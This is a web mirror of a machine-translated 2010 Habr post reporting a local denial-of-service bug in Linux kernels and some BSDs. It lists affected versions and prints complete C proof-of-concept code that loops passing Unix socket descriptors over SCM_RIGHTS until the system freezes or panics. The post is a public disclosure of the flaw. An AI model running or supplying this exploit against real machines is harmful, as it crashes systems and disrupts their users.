<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Local Linux kernel vulnerability (and more), DoS</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Published code that causes the computer to freeze (100% load of all cores, exhaustion of file descriptors). 

 Link to code: lkml.org/lkml/2010/11/25/...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Local Linux kernel vulnerability (and more), DoS</h1><div class="post__text post__text-html js-mediator-article">  Published code that causes the computer to freeze (100% load of all cores, exhaustion of file descriptors). <br><br>  Link to code: <a href="http://lkml.org/lkml/2010/11/25/8">lkml.org/lkml/2010/11/25/8</a> <br><br>  Tested on 27, 32 - hangup is playing.  32/64 bits. 
      <br>
        <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"></script>')</script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push({});
        </script>
      <br>
      I clarify: after 1-2 seconds the crash dump flies (I don‚Äôt have time to read), the host is overloaded.  In another test, the system dropped after the program was completed (after about 5-7 seconds). <br><br>  PS Experts from Laura say that FreeBSD 8.1 is also falling. <br><br>  PPS Suddenly - on CentOS 5.5 with 2.6.18 does not fall.  If you run from under the root, it drops, from under the user, it just quietly works.  In this case, the root in the next console does not interfere with work and the system does not fall. <br><br>  I am trying to clarify the situation: <br><br>  1) CentOS 2.6.18 / 64 with an unprivileged user is not affected. <br>  2) Debian Squeeze 2.6.34 / 64 with a non-user-delegated (kernel panic). <br>  3) According to rumors, in some FreeBSD it was possible to reproduce (from the comments, FreeBSD 8.2-PRERELEASE is not reproduced) <br>  4) From comments - on Ubuntu 2.6.32 / 64 could not be played, at 2.6.36 is played. <br>  5) Ubuntu 2.6.34 / 64 - playing <br>  6) From the comments - RHEL5.5 does not freeze, but it slows down and makes it difficult to kill the process. <br>  7) From comments: FreeBSD 4.11, 8.1, OpebBSD 4.6, 4.8, DragonFLY BSD 2.8.0 - are subject <br>  8) OpenVZ + 2.6.18 Debian / Centos - not playable. <br><br>  PPPS for those who test - you need to run from an unselected user. <br><a name="habracut"></a><br>  Test text: <br><br><pre> #include &lt;sys / socket.h&gt;
 #include &lt;sys / un.h&gt;

 static int send_fd (int unix_fd, int fd)
 {
   struct msghdr msgh;
   struct cmsghdr * cmsg;
   char buf [CMSG_SPACE (sizeof (fd))];
   memset (&amp; msgh, 0, sizeof (msgh));
   memset (buf, 0, sizeof (buf));

   msgh.msg_control = buf;
   msgh.msg_controllen = sizeof (buf);

   cmsg = CMSG_FIRSTHDR (&amp; msgh);
   cmsg-&gt; cmsg_len = CMSG_LEN (sizeof (fd));
   cmsg-&gt; cmsg_level = SOL_SOCKET;
   cmsg-&gt; cmsg_type = SCM_RIGHTS;

   msgh.msg_controllen = cmsg-&gt; cmsg_len;

   memcpy (CMSG_DATA (cmsg), &amp; fd, sizeof (fd));
   return sendmsg (unix_fd, &amp; msgh, 0);
 }

 int main ()
 {
   int fd [2], ff [2];
   int target;
   if (socketpair (PF_UNIX, SOCK_SEQPACKET, 0, fd) == - 1)
     return 1;
   for (;;)
   {
     if (socketpair (PF_UNIX, SOCK_SEQPACKET, 0, ff) == - 1)
	 return 2;
     send_fd (ff [0], fd [0]);
     send_fd (ff [0], fd [1]);
     close (fd [1]);
     close (fd [0]);
     fd [0] = ff [0];
     fd [1] = ff [1];
   }
 }
</pre></div><p>Source: https://habr.com/ru/post/108835/</p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../108827/index.html">Runet Prize 2010 - Habraytogi of the Year</a></li>
<li><a href="../108828/index.html">The release of the second part of the book "Smashing Magazine": add yourself to the book!</a></li>
<li><a href="../10883/index.html">Weekly design</a></li>
<li><a href="../108831/index.html">NLP: spell check - an inside look (part 1)</a></li>
<li><a href="../108833/index.html">Configuring Active / Passive PostgreSQL Cluster using Pacemaker, Corosync, and DRBD (CentOS 5.5)</a></li>
<li><a href="../108837/index.html">A project at the idea stage? (thinking out loud)</a></li>
<li><a href="../108838/index.html">Windows Phone 7 jailbreak published</a></li>
<li><a href="../10884/index.html">When you need to start ...</a></li>
<li><a href="../108840/index.html">Phrases overtook FarmVille in the list of the most popular applications</a></li>
<li><a href="../108842/index.html">Project managers are dying alone and for nothing: raise the flag!</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>